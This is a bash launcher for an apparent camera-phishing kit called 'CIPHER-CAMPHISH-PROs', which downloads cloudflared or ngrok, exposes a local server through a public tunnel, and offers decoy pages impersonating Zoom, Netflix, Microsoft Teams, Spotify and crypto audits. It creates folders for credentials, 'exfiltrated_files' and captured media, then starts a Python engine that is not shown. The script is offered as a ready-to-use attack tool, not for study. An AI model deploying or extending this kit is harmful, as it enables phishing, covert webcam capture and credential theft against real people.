#!/bin/bash
# PROJECT  : CIPHER-CAMPHISH-PROs v10.0 [ZENITH]
# ARCHITECT: Biruk Getachew (CIPHER)
# MOTTO    : "Deciphering the future before it happens.."

# --- 1. NEURAL COLOR PALETTE ---
CYAN='\033[38;5;51m'
LIME='\033[38;5;118m'
GOLD='\033[38;5;220m'
RED='\033[38;5;196m'
WHT='\033[38;5;255m'
NC='\033[0m'

# --- 2. SYSTEM INTEGRITY CHECK ---
prep_env() {
    # Kill any existing process on port 5000 to prevent errors
    fuser -k 5000/tcp > /dev/null 2>&1
    pkill -f cloudflared > /dev/null 2>&1
    pkill -f ngrok > /dev/null 2>&1
}

# --- 3. MODULAR BINARY MANAGER ---
install_module() {
    local mod=$1
    local arch=$(uname -m)
    mkdir -p core
    case $mod in
        "cloudflared")
            if [[ ! -f "core/cloudflared" ]]; then
                echo -e "${LIME}[*] Provisioning Cloudflared for $arch...${NC}"
                if [[ $arch == "aarch64" || $arch == "arm" ]]; then
                    curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -o core/cloudflared
                else
                    curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o core/cloudflared
                fi
                chmod +x core/cloudflared
            fi ;;
        "ngrok")
            if [[ ! -f "core/ngrok" ]]; then
                echo -e "${LIME}[*] Provisioning Ngrok Gateway...${NC}"
                if [[ $arch == "aarch64" || $arch == "arm" ]]; then
                    curl -L https://bin.equinox.io/c/bPR9B2h3Y6e/ngrok-v3-stable-linux-arm64.tgz -o core/ngrok.tgz
                else
                    curl -L https://bin.equinox.io/c/bPR9B2h3Y6e/ngrok-v3-stable-linux-amd64.tgz -o core/ngrok.tgz
                fi
                tar -xzf core/ngrok.tgz -C core/ && rm core/ngrok.tgz
                chmod +x core/ngrok
            fi ;;
    esac
}

# --- 4. THE SOVEREIGN BANNER ---
banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
                  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
              ▄▓▓▓▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
            ▄▓▓▓▀
           ▓▓▓▀   ▄▄▄▄▄
         ▓▓▓▀  ▓▓▓▓▓▓▓▓▓▓
       ▄▓▓      ▓▓▓      ▓▓▓▄
      ▓▓▓▓   ▐▓▓▓      ▐▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
       ▀▓▓▓▄  ▓▓▓▄    ▄▓▓▓      ▐▓▓▓ ▐▓▓▓
         ▀▓▓▓  ▀▓▓▓▓▓▓▓▓▀       ▐▓▓▓  ▓▓
           ▀▓▓▓                  ▀▀
             ▓▓▓▄
              ▐▓▓▓▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                ▀▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀
EOF
    echo -e "      ${GOLD}\"Deciphering the future before it happens..\"${NC}"
    echo -e "${WHT}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${LIME} [AUTHOR]   : Biruk Getachew (CIPHER)"
    echo -e " [PROTOCOL] : NEURAL-OVERLORD v10.0 [ZENITH]${NC}"
    echo -e "${WHT}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# --- 5. MASTER INTERFACE ---
start_suite() {
    prep_env
    banner
    # Step 1: Infrastructure
    echo -e "${CYAN}[ SELECT INFRASTRUCTURE ]${NC}"
    echo -e " ${WHT}[1]${NC} Cloudflared (Stealth Tunnel)"
    echo -e " ${WHT}[2]${NC} Ngrok Gateway (Legacy)"
    echo -e " ${WHT}[3]${NC} Localhost (Internal Node)"
    echo -e "${WHT}------------------------------------------------------------------------${NC}"
    read -p " CHOICE > " infra

    # Step 2: Decoy Templates
    banner
    echo -e "${CYAN}[ SELECT DECOY TEMPLATE ]${NC}"
    echo -e " ${WHT}[01]${NC} Security Audit        ${WHT}[05]${NC} Netflix Household Verify"
    echo -e " ${WHT}[02]${NC} Zoom Video Test       ${WHT}[06]${NC} Microsoft Teams Join"
    echo -e " ${WHT}[03]${NC} Spotify Acoustic Sync  ${WHT}[07]${NC} AI Biometric Lens"
    echo -e " ${WHT}[04]${NC} Crypto Hardware Audit  ${WHT}[08]${NC} System Self-Destruct"
    echo -e "${WHT}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p " TEMPLATE > " theme_choice

    # Theme Mapping
    case $theme_choice in
        01|1) export CIPHER_THEME="audit" ;;
        02|2) export CIPHER_THEME="zoom" ;;
        03|3) export CIPHER_THEME="spotify" ;;
        04|4) export CIPHER_THEME="crypto" ;;
        05|5) export CIPHER_THEME="netflix" ;;
        06|6) export CIPHER_THEME="teams" ;;
        07|7) export CIPHER_THEME="ai_lens" ;;
        08|8) exit ; echo -e "${RED}[!] System exit.${NC}" ; exit ;;
        *) export CIPHER_THEME="audit" ;;
    esac

    # Infrastructure Activation
    if [ "$infra" == "1" ]; then
        install_module "cloudflared"
        echo -e "${LIME}[*] Launching Stealth Tunnel...${NC}"
        ./core/cloudflared tunnel --url http://localhost:5000 > /dev/null 2>&1 &
        sleep 5
    elif [ "$infra" == "2" ]; then
        install_module "ngrok"
        echo -e "${LIME}[*] Launching Ngrok Gateway...${NC}"
        ./core/ngrok http 5000 > /dev/null 2>&1 &
        sleep 5
    else
        echo -e "${LIME}[*] Local Node Active.${NC}"
    fi

    # Initialize Backend Engine
    echo -e "${GOLD}[*] Booting Neural Engine [Theme: $CIPHER_THEME]...${NC}"
    if [[ -f "core/engine.py" ]]; then
        python3 core/engine.py
    else
        echo -e "${RED}[!] Error: core/engine.py not found in ./core/ folder.${NC}"
    fi
}

# --- 6. BOOTSTRAP ---
mkdir -p core vault/deep_intel vault/neural_media vault/exfiltrated_files vault/credentials vault/system_logs
start_suite
